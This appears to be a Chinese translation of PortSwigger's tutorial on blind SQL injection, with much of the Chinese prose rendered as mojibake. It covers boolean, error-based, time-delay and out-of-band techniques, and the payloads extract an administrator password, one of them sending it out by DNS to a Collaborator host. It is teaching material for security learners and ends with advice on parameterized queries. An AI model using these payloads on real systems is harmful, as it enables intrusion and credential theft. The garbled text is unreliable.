---
description: 'åŸæ–‡é“¾æ¥ï¼šhttps://portswigger.net/web-security/sql-injection/blind'
---

# SQLç›²æ³¨

æœ¬éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†æè¿°ä»€ä¹ˆæ˜¯ SQL ç›²æ³¨æ¼æ´ï¼Œå¹¶è§£é‡Šå‘ç°å’Œåˆ©ç”¨ SQL ç›²æ³¨æ¼æ´çš„å¤šç§æŠ€æœ¯ã€‚

### ä»€ä¹ˆæ˜¯SQLç›²æ³¨ï¼Ÿ

å½“åº”ç”¨ç¨‹åºå®¹æ˜“æ”¶åˆ° SQL æ³¨å…¥ï¼Œä½†å…¶ HTTP å“åº”ä¸åŒ…å«ç›¸å…³çš„ SQL æŸ¥è¯¢ç»“æœæˆ–ä»»ä½•æ•°æ®åº“é”™è¯¯çš„è¯¦ç»†ä¿¡æ¯æ—¶ï¼Œå°±ä¼šå‡ºç° SQL ç›²æ³¨ã€‚

åœ¨ SQL ç›²æ³¨æ¼æ´ä¸‹ï¼Œè®¸å¤šè¯¸å¦‚ [UNION æ”»å‡»](https://portswigger.net/web-security/sql-injection/union-attacks)ä¹‹ç±»çš„æŠ€æœ¯éƒ½ä¸ä¼šèµ·ä½œç”¨ï¼Œè¿™æ˜¯å› ä¸ºè¿™äº›æŠ€æœ¯éƒ½ä¾èµ–äºåº”ç”¨ç¨‹åºå“åº”è¿”å›æ³¨å…¥æŸ¥è¯¢ç»“æœé›†ã€‚ä½†æ˜¯ä»ç„¶å¯ä»¥åˆ©ç”¨ SQL ç›²æ³¨è®¿é—®æœªæˆæƒæ•°æ®ï¼Œåªæ˜¯å¿…é¡»é‡‡ç”¨ä¸åŒçš„æŠ€æœ¯ã€‚

### é€šè¿‡è§¦å‘æ¡ä»¶å“åº”æ¥åˆ©ç”¨SQLç›²æ³¨

è€ƒè™‘å­˜åœ¨ä¸€ä¸ªä½¿ç”¨è¿½è¸ª cookies æ¥æ”¶é›†å’Œåˆ†æä½¿ç”¨æƒ…å†µçš„åº”ç”¨ç¨‹åºã€‚å¯¹åº”ç”¨ç¨‹åºçš„è¯·æ±‚åŒ…æ‹¬ä¸€ä¸ª cookies æ ‡å¤´ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

```text
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

å½“å¤„ç†åŒ…å« TrackingId cookie çš„è¯·æ±‚æ—¶ï¼Œåº”ç”¨ç¨‹åºä½¿ç”¨ SQL æŸ¥è¯¢æ¥ç¡®å®šè¯¥ç”¨æˆ·æ˜¯å¦ä¸ºå·²çŸ¥ç”¨æˆ·ï¼š

```text
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

æ­¤æŸ¥è¯¢å®¹æ˜“å—åˆ° SQL æ³¨å…¥æ¼æ´å½±å“ï¼Œä½†æŸ¥è¯¢ç»“æœä¸ä¼šè¿”å›ç»™ç”¨æˆ·ã€‚ç„¶è€Œï¼Œåº”ç”¨ç¨‹åºçš„é€»è¾‘è¡Œä¸ºä¼šæœ‰æ‰€ä¸åŒï¼Œå…·ä½“å–å†³äºæŸ¥è¯¢æ˜¯å¦è¿”å›ä»»ä½•æ•°æ®ã€‚å¦‚æœè¿”å›æ•°æ®ï¼ˆå› ä¸ºå·²æäº¤è¯†åˆ«çš„ TrackingIdï¼‰ï¼Œåˆ™é¡µé¢å†…å°†æ˜¾ç¤º â€œæ¬¢è¿å›æ¥â€ æ¶ˆæ¯ã€‚

è¿™ç§è¡Œä¸ºè¶³ä»¥è®©æˆ‘ä»¬æ ¹æ®æ³¨å…¥æ¡ä»¶æœ‰æ¡ä»¶çš„è§¦å‘ä¸åŒçš„å“åº”ï¼Œä»è€Œåˆ©ç”¨ SQL ç›²æ³¨æ¼æ´æ£€ç´¢ä¿¡æ¯ã€‚è¦æŸ¥çœ‹å…¶å·¥ä½œåŸç†ï¼Œå‡è®¾æˆ‘ä»¬å‘é€äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚ä¾æ¬¡åŒ…å«ä»¥ä¸‹ TrackingId Cookie å€¼ï¼š

```text
â€¦xyz' AND '1'='1
â€¦xyz' AND '1'='2
```

ç¬¬ä¸€æ¡è¯·æ±‚å°†ä¼šè¿”å›æŸ¥è¯¢ç»“æœï¼Œå› ä¸ºæ³¨å…¥æ¡ä»¶ or 1=1 ä¸º trueï¼Œé¡µé¢å°†æ˜¾ç¤º â€œæ¬¢è¿å›æ¥â€ æ¶ˆæ¯ã€‚ç„¶è€Œç¬¬äºŒæ¡è¯·æ±‚ä¸ä¼šè¿”å›ä»»ä½•æŸ¥è¯¢ç»“æœï¼Œå› ä¸ºæ³¨å…¥æ¡ä»¶ä¸º falseï¼Œé¡µé¢ä¸ä¼šæ˜¾ç¤º â€œæ¬¢è¿å›æ¥â€ æ¶ˆæ¯ã€‚è¿™å°±ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿç¡®å®šä»»ä½•å•ä¸ªæ³¨å…¥æ¡ä»¶çš„ç­”æ¡ˆï¼Œä»è€Œä¸€æ¬¡æå–ä»¥ä¸ºæ•°æ®ã€‚

ä¾‹å¦‚ï¼Œå‡è®¾æ•°æ®åº“å­˜åœ¨ä¸€ä¸ª users è¡¨ï¼Œè¯¥è¡¨æœ‰ username å’Œ password ä¸¤ä¸ªåˆ—å­—æ®µï¼Œè¡¨å­˜å‚¨äº†ç”¨æˆ·åä¸º Administrator çš„ä¸€æ¡æ•°æ®ã€‚é€šè¿‡å‘é€ä¸€ç³»åˆ—è¾“å…¥æ¥ä¸€æ¬¡æµ‹è¯•ä¸€ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç³»ç»Ÿåœ°ç¡®å®šè¯¥ç”¨æˆ·çš„ passwordã€‚

ä¸ºäº†è¾¾åˆ°ä¸Šè¿°ç›®çš„ï¼Œæˆ‘ä»¬ä»¥å¦‚ä¸‹ payload å¼€å§‹æµ‹è¯•ï¼š

```text
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

é¡µé¢è¿”å› â€œæ¬¢è¿å›æ¥â€ æ¶ˆæ¯ï¼Œè¿™è¡¨æ˜æ³¨å…¥æ¡ä»¶ä¸º trueï¼Œpassword å­—æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å€¼è¦æ¯”'m' å¤§ã€‚

ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬å‘é€ç¬¬äºŒæ¡æµ‹è¯• payload:

```text
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

é¡µé¢æ²¡æœ‰è¿”å› â€œæ¬¢è¿å›æ¥â€ æ¶ˆæ¯ï¼Œè¿™è¡¨æ˜æ³¨å…¥æ¡ä»¶ä¸º falseï¼Œpassword å­—æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å€¼è¦å°äºæ¯”'t' ã€‚

æœ€ç»ˆï¼Œæˆ‘ä»¬å‘é€å¦‚ä¸‹æµ‹è¯• payloadï¼Œé¡µé¢è¿”å› â€œæ¬¢è¿å›æ¥â€ æ¶ˆæ¯ï¼Œè¿™å°±å¯ä»¥ç¡®å®š password å­—æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å€¼'s'ï¼š

```text
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

é€šè¿‡ä»¥ä¸Šæ­¥éª¤æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥ç³»ç»Ÿåœ°ç¡®è®¤ Administrator ç”¨æˆ·çš„å®Œæ•´å¯†ç ã€‚

> Note
>
> `SUBSTRING`å‡½æ•°åœ¨æŸäº›ç±»å‹çš„æ•°æ®åº“ä¸­ç§°ä¸º`SUBSTR`ã€‚æ›´å¤šç»†èŠ‚ï¼Œè¯·å‚è§[SQLæ³¨å…¥å¤‡å¿˜å•](https://portswigger.net/web-security/sql-injection/cheat-sheet)ã€‚

{% hint style="warning" %}
å®éªŒï¼š[å¸¦æ¡ä»¶å“åº”çš„SQLç›²æ³¨](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
{% endhint %}

### é€šè¿‡è§¦å‘SQLé”™è¯¯æ¥è¯±å¯¼æ¡ä»¶å“åº”

åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå‡è®¾åº”ç”¨ç¨‹åºå³ä½¿æ‰§è¡Œä¸åŒçš„ SQL æŸ¥è¯¢ï¼Œä½†æ˜¯æ ¹æ®æŸ¥è¯¢è¿”å›çš„ä»»ä½•æ•°æ®åœ¨è¡Œä¸ºä¸Šåˆ¤æ–­éƒ½æ²¡æœ‰ä¸åŒç‚¹ã€‚è¿™æ ·å‰é¢çš„æ–¹æ³•å°±å¤±æ•ˆäº†ï¼Œå› ä¸ºæ³¨å…¥ä¸åŒçš„ boolean æ¡ä»¶ä¸ä¼šå½±å“åº”ç”¨ç¨‹åºçš„å“åº”ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šå¸¸å¾ˆå¯èƒ½é‡‡ç”¨æ ¹æ®æ³¨å…¥æ¡ä»¶ï¼Œé€‰æ‹©æ€§è§¦å‘ SQL é”™è¯¯ï¼Œæ¥è¯±ä½¿åº”ç”¨ç¨‹åºè¿”å›æ¡ä»¶å“åº”ã€‚è¿™æ¶‰åŠä¿®æ”¹æŸ¥è¯¢ï¼Œä»¥ä¾¿åœ¨æ¡ä»¶ä¸º true æ—¶å°†å¼•èµ·æ•°æ®åº“é”™è¯¯ï¼Œè€Œæ¡ä»¶ä¸º false æ—¶åˆ™ä¸ä¼šå¯¼è‡´æ•°æ®åº“é”™è¯¯ã€‚é€šå¸¸ï¼Œæ•°æ®åº“å¼•å‘çš„æœªå¤„ç†é”™è¯¯ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºå“åº”æœ‰æ‰€ä¸åŒï¼Œä»è€Œèƒ½ä½¿æˆ‘ä»¬æ¨æ–­å‡ºæ³¨å…¥æ¡ä»¶çš„çœŸå®æ€§ã€‚

è¦æŸ¥çœ‹å…¶å·¥ä½œåŸç†ï¼Œå‡è®¾æˆ‘ä»¬å‘é€ä¸¤ä¸ªè¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚ä¾æ¬¡åŒ…å«ä»¥ä¸‹ TrackingId cookie å€¼ï¼š

```text
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

è¿™äº›è¾“å…¥ä½¿ç”¨ CASE å…³é”®å­—æ¥æµ‹è¯•æ¡ä»¶ï¼Œå¹¶æ ¹æ®è¡¨è¾¾å¼æ˜¯å¦ä¸º true æ¥è¿”å›ä¸åŒçš„è¡¨è¾¾å¼ã€‚ç¬¬ä¸€æ¡è¾“å…¥ï¼Œè¡¨è¾¾å¼ä¸º NULLï¼Œè¿™ä¸ä¼šæœ‰ä»»ä½•é”™è¯¯ã€‚ç¬¬äºŒæ¡è¾“å…¥ä¸­ï¼Œè¡¨è¾¾å¼ä¸º 1/0ï¼Œè¿™ä¼šè§¦å‘æ•°æ®åº“çš„é›¶é™¤é”™è¯¯ã€‚å‡è®¾è¿™ä¸ªé”™è¯¯å¯¼è‡´åº”ç”¨ç¨‹åºçš„ HTTP å“åº”æœ‰æ‰€ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®å·®å¼‚æ¨æ–­æ³¨å…¥æ¡ä»¶æ˜¯å¦ä¸º trueã€‚

ä½¿ç”¨è¿™é¡¹æŠ€æœ¯ï¼Œå†ç»“åˆä¹‹å‰æè¿°çš„æ‰‹æ³•ï¼Œå°±å¯ä»¥ä¸€æ¬¡éªŒè¯ä¸€ä¸ªå­—ç¬¦ç³»ç»Ÿåœ°æ£€ç´¢æ•°æ®ï¼š

```text
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

> Note
>
> è§¦å‘æ¡ä»¶é”™è¯¯çš„æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œä¸åŒçš„æŠ€æœ¯ä½¿ç”¨äºä¸åŒçš„æ•°æ®åº“ç±»å‹ã€‚æ›´å¤šç»†èŠ‚ï¼Œè¯·å‚è§[SQLæ³¨å…¥å¤‡å¿˜å•](https://portswigger.net/web-security/sql-injection/cheat-sheet)ã€‚

{% hint style="warning" %}
å®éªŒï¼š[å¸¦æ¡ä»¶é”™è¯¯çš„SQLç›²æ³¨](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
{% endhint %}

### é€šè¿‡è§¦å‘æ—¶é—´å»¶æ—¶æ¥åˆ©ç”¨SQLç›²æ³¨

åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå‡è®¾åº”ç”¨ç¨‹åºç°åœ¨æ•è·æ•°æ®åº“é”™è¯¯å¹¶å¦¥å–„å¤„ç†å®ƒä»¬ã€‚å½“æ‰§è¡Œæ³¨å…¥çš„ SQL æŸ¥è¯¢æ—¶è§¦å‘æ•°æ®åº“é”™è¯¯ä¸å†å¯¼è‡´åº”ç”¨ç¨‹åºå“åº”ä¸­çš„ä»»ä½•å·®å¼‚ï¼Œå› æ­¤å¯¼è‡´æ¡ä»¶é”™è¯¯çš„ä¸Šè¿°æŠ€æœ¯å°†ä¸èµ·ä½œç”¨ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šå¸¸æœ‰å¯èƒ½é€šè¿‡æ ¹æ®æ³¨å…¥æ¡ä»¶æœ‰æ¡ä»¶åœ°è§¦å‘æ—¶é—´å»¶è¿Ÿæ¥åˆ©ç”¨ç›² SQL æ³¨å…¥æ¼æ´ã€‚ç”±äº SQL æŸ¥è¯¢é€šå¸¸ç”±åº”ç”¨ç¨‹åºåŒæ­¥å¤„ç†ï¼Œå› æ­¤å»¶è¿Ÿæ‰§è¡Œ SQL æŸ¥è¯¢ä¹Ÿä¼šå»¶è¿Ÿ HTTP å“åº”ã€‚è¿™ä½¿æˆ‘ä»¬å¯ä»¥æ ¹æ®æ”¶åˆ° HTTP å“åº”ä¹‹å‰èŠ±è´¹çš„æ—¶é—´æ¥æ¨æ–­æ³¨å…¥æ¡ä»¶çš„çœŸå®æ€§ã€‚

è§¦å‘æ—¶é—´å»¶è¿Ÿçš„æŠ€æœ¯ä¸æ‰€ä½¿ç”¨çš„æ•°æ®åº“ç±»å‹é«˜åº¦ç›¸å…³ã€‚åœ¨ Microsoft SQL Server ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç±»ä¼¼çš„è¾“å…¥æ¥æµ‹è¯•æ¡ä»¶å¹¶æ ¹æ®è¡¨è¾¾å¼æ˜¯å¦ä¸ºçœŸè§¦å‘å»¶è¿Ÿï¼š

```text
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

è¿™äº›è¾“å…¥ä¸­çš„ç¬¬ä¸€ä¸ªå°†ä¸ä¼šè§¦å‘å»¶æ—¶ï¼Œå› ä¸ºæ¡ä»¶ 1=2 ä¸º falseï¼Œç¬¬äºŒä¸ªè¾“å…¥å°†è§¦å‘ 10 ç§’çš„å»¶æ—¶ï¼Œå› ä¸ºæ¡ä»¶ 1=1 ä¸º trueã€‚

ä½¿ç”¨è¿™é¡¹æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç³»ç»Ÿåœ°ä¸€æ¬¡æµ‹è¯•ä¸€ä¸ªå­—ç¬¦æ¥ä»¥å·²æè¿°çš„æ–¹å¼æ£€ç´¢æ•°æ®ï¼š

```text
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

> ğŸ“Note
>
> åœ¨SQLæŸ¥è¯¢ä¸­è§¦å‘æ—¶é—´å»¶è¿Ÿçš„æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œä¸åŒçš„æŠ€æœ¯é€‚ç”¨äºä¸åŒç±»å‹çš„æ•°æ®åº“ã€‚æ›´å¤šç»†èŠ‚ï¼Œè¯·å‚è§[SQLæ³¨å…¥å¤‡å¿˜å•](https://portswigger.net/web-security/sql-injection/cheat-sheet)ã€‚

{% hint style="warning" %}
å®éªŒï¼š[å¸¦æ—¶é—´å»¶è¿Ÿçš„SQLç›²æ³¨](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
{% endhint %}

{% hint style="warning" %}
å®éªŒï¼š[å¸¦æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„SQLç›²æ³¨](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
{% endhint %}

### ä½¿ç”¨å¸¦å¤–æŠ€æœ¯ï¼ˆOASTï¼‰åˆ©ç”¨SQLç›²æ³¨

ç°åœ¨ï¼Œå‡è®¾åº”ç”¨ç¨‹åºæ‰§è¡Œç›¸åŒçš„ SQL æŸ¥è¯¢ï¼Œä½†æ˜¯é‡‡ç”¨å¼‚æ­¥æ–¹å¼å¤„ç†ã€‚åº”ç”¨ç¨‹åºç»§ç»­ä½¿ç”¨åŸå§‹çº¿ç¨‹å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œå¹¶ä½¿ç”¨å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œä½¿ç”¨ tracking cookie çš„ SQL æŸ¥è¯¢ã€‚è¯¥æŸ¥è¯¢ä¾ç„¶å®¹æ˜“è¢« SQL æ³¨å…¥æ¼æ´æ”»å‡»ï¼Œä½†æ˜¯åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ‰€ä»‹ç»çš„æŠ€æœ¯éƒ½ä¸èµ·ä½œç”¨ï¼šåº”ç”¨ç¨‹åºçš„å“åº”ä¸å–å†³äºæŸ¥è¯¢æ˜¯å¦è¿”å›ä»»ä½•æ•°æ®ï¼Œæ•°æ®åº“æ˜¯å¦å‘ç”Ÿé”™è¯¯æˆ–æ‰§è¡ŒæŸ¥è¯¢æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šå¸¸æœ‰å¯èƒ½é€šè¿‡è§¦å‘ä¸æˆ‘ä»¬æ§åˆ¶çš„ç³»ç»Ÿçš„å¸¦å¤–ç½‘ç»œäº¤äº’æ¥åˆ©ç”¨ SQL æ³¨å…¥æ¼æ´ã€‚å¦‚å‰æ‰€è¿°ï¼Œå¯ä»¥æ ¹æ®æ³¨å…¥çš„æ¡ä»¶æœ‰æ¡ä»¶åœ°è§¦å‘è¿™äº›æ“ä½œï¼Œä¸€æ¬¡æ¨æ–­ä¸€ä½ä¿¡æ¯ã€‚ä½†æ˜¯æ›´å¼ºå¤§çš„æ˜¯ï¼Œå¯ä»¥ç›´æ¥åœ¨ç½‘ç»œäº¤äº’æœ¬èº«ä¸­æ¸—å…¥æ•°æ®ã€‚

å¯ä»¥ä½¿ç”¨å¤šç§ç½‘ç»œåè®®æ¥å®ç°æ­¤ç›®çš„ï¼Œä½†æ˜¯æœ€æœ‰æ•ˆçš„é€šå¸¸æ˜¯ DNSã€‚è¿™æ˜¯å› ä¸ºå¾ˆå¤šç”Ÿäº§ç½‘ç»œéƒ½å…è®¸ DNS æŸ¥è¯¢è‡ªç”±å‘å‡ºï¼Œå› ä¸ºå®ƒä»¬å¯¹äºç”Ÿäº§ç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œè‡³å…³é‡è¦ã€‚

ä½¿ç”¨å¸¦å¤–æŠ€æœ¯çš„æœ€ç®€å•ã€æœ€å¯é çš„æ–¹æ³•æ˜¯ä½¿ç”¨ Burp [Collaborator](https://portswigger.net/burp/documentation/collaborator)ã€‚è¿™æ˜¯ä¸€å°æœåŠ¡å™¨ï¼Œæä¾›å„ç§ç½‘ç»œæœåŠ¡ï¼ˆåŒ…æ‹¬ DNSï¼‰çš„è‡ªå®šä¹‰å®ç°ï¼Œå¹¶å…è®¸æ‚¨æ£€æµ‹ç”±äºå°†å•ä¸ªæœ‰æ•ˆè´Ÿè½½å‘é€ç»™æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºè€Œå¯¼è‡´ä½•æ—¶å‘ç”Ÿç½‘ç»œäº¤äº’ã€‚ [Burp Suite Professional](https://portswigger.net/burp/pro) å†…ç½®å¯¹ Burp Collaborator çš„æ”¯æŒï¼Œæ— éœ€è¿›è¡Œé…ç½®ã€‚

è§¦å‘ DNS æŸ¥è¯¢çš„æŠ€æœ¯ä¸æ‰€ä½¿ç”¨çš„æ•°æ®åº“ç±»å‹é«˜åº¦ç›¸å…³ã€‚åœ¨ Microsoft SQL Server ä¸Šï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºçš„è¾“å…¥æ¥åœ¨æŒ‡å®šåŸŸä¸Šå¼•èµ· DNS æŸ¥æ‰¾ï¼š

```text
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

è¿™å°†å¯¼è‡´æ•°æ®åº“å¯¹ä»¥ä¸‹åŸŸæ‰§è¡ŒæŸ¥æ‰¾ï¼š

```text
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Burp Suite çš„ [Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) ç”Ÿæˆå”¯ä¸€çš„å­åŸŸï¼Œå¹¶è½®è¯¢ Collaborator æœåŠ¡å™¨ä»¥ç¡®è®¤ä½•æ—¶è¿›è¡Œä»»ä½• DNS æŸ¥æ‰¾ã€‚

{% hint style="warning" %}
å®éªŒï¼š[å¸¦å¤–äº¤äº’çš„SQLç›²æ³¨](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
{% endhint %}

ç¡®å®šäº†è§¦å‘å¸¦å¤–äº¤äº’çš„æ–¹æ³•åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸¦å¤–é€šé“ä»æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä¸­çªƒå–æ•°æ®ã€‚ä¾‹å¦‚ï¼š

```text
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

æ­¤è¾“å…¥è¯»å– Administrator ç”¨æˆ·çš„å¯†ç ï¼Œé™„åŠ å”¯ä¸€çš„ Collaborator å­åŸŸï¼Œå¹¶è§¦å‘ DNS æŸ¥æ‰¾ã€‚è¿™å°†å¯¼è‡´å¦‚ä¸‹æ‰€ç¤ºçš„ DNS æŸ¥æ‰¾ï¼Œä»è€Œå…è®¸æˆ‘ä»¬æŸ¥çœ‹æ•è·çš„å¯†ç ï¼š

```text
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

å¸¦å¤–ï¼ˆOASTï¼‰æŠ€æœ¯æ˜¯æ£€æµ‹å’Œåˆ©ç”¨ SQL ç›²æ³¨çš„ä¸€ç§éå¸¸å¼ºå¤§çš„æ–¹æ³•ï¼Œå› ä¸ºè¯¥æ–¹æ³•æˆåŠŸçš„å¯èƒ½æ€§å¾ˆé«˜ï¼Œå¹¶ä¸”èƒ½å¤Ÿç›´æ¥åœ¨å¸¦å¤–é€šé“ä¸­çªƒå–æ•°æ®ã€‚å› æ­¤ï¼Œå³ä½¿åœ¨å…¶ä»–ç›²æ³¨åˆ©ç”¨æŠ€æœ¯ç¡®å®èµ·ä½œç”¨çš„æƒ…å†µä¸‹ï¼ŒOAST æŠ€æœ¯ä¹Ÿé€šå¸¸æ˜¯é¦–é€‰çš„ã€‚

> **Note**
>
> è§¦å‘å¸¦å¤–äº¤äº’çš„æ–¹æ³•æœ‰å¤šç§ï¼Œä¸åŒçš„æŠ€æœ¯é€‚ç”¨äºä¸åŒç±»å‹çš„æ•°æ®åº“ã€‚æ›´å¤šè¯¦æƒ…ï¼Œè¯·å‚è§[SQLæ³¨å…¥å¤‡å¿˜å•](https://portswigger.net/web-security/sql-injection/cheat-sheet)ã€‚

{% hint style="warning" %}
å®éªŒï¼š[å¸¦å¤–æ•°æ®æ¸—å‡ºçš„SQLç›²æ³¨](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
{% endhint %}

### å¦‚ä½•é˜²æ­¢SQLç›²æ³¨æ”»å‡»

å°½ç®¡æŸ¥æ‰¾å’Œåˆ©ç”¨ SQL ç›²æ³¨æ¼æ´æ‰€éœ€çš„æŠ€æœ¯ä¸å¸¸è§„ SQL æ³¨å…¥ç›¸æ¯”æœ‰æ‰€ä¸åŒä¸”æ›´ä¸ºå¤æ‚ï¼Œä½†æ˜¯æ— è®ºè¯¥æ¼æ´æ˜¯å¦ä¸ºç›²æ³¨ï¼Œé˜²æ­¢ SQL æ³¨å…¥æ‰€éœ€çš„æªæ–½éƒ½æ˜¯ç›¸åŒçš„ã€‚

ä¸å¸¸è§„ SQL æ³¨å…¥ä¸€æ ·ï¼Œå¯ä»¥é€šè¿‡è°¨æ…ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æ¥é˜²æ­¢ SQL ç›²æ³¨æ”»å‡»ï¼Œè¿™å¯ä»¥ç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸ä¼šå¹²æ‰°ç›®æ ‡ SQL æŸ¥è¯¢çš„ç»“æ„ã€‚

> é˜…è¯»æ›´å¤š
>
> [å¦‚ä½•é˜²èŒƒSQLæ³¨å…¥](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection)
>
> [ä½¿ç”¨Burp Suiteçš„Webæ¼æ´æ‰«æå™¨å¯»æ‰¾SQLç›²æ³¨æ¼æ´](https://portswigger.net/burp/vulnerability-scanner)

